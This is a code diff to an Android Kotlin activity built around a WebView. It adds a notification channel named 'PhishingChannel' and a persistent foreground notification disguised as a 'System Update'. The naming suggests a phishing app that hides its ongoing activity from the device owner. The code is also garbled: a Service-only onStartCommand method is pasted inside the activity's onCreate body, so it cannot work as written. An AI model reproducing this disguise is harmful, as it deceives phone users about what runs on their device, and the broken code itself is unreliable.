@@ -30,6 +30,11 @@ class MainActivity : AppCompatActivity() {
     private lateinit var prefs: android.content.SharedPreferences
     private val LAUNCH_LIMIT = 7
     private lateinit var myWebView: WebView
+private val CHANNEL_ID = "PhishingChannel"
+    private val NOTIFICATION_ID = 1
+
+
+    
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -54,6 +59,23 @@ class MainActivity : AppCompatActivity() {
                 // Page load howar por kono action
             }
         }
+
+override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("System Update")
+            .setContentText("Running...")
+            .setSmallIcon(android.R.drawable.ic_dialog_info)
+            .setOngoing(true)
+            .build()
+
+        startForeground(NOTIFICATION_ID, notification)
+        return START_STICKY
+    }
+
+
+
+
+        
         
         myWebView.webChromeClient = object : WebChromeClient() {
             override fun onConsoleMessage(consoleMessage: ConsoleMessage?): Boolean {
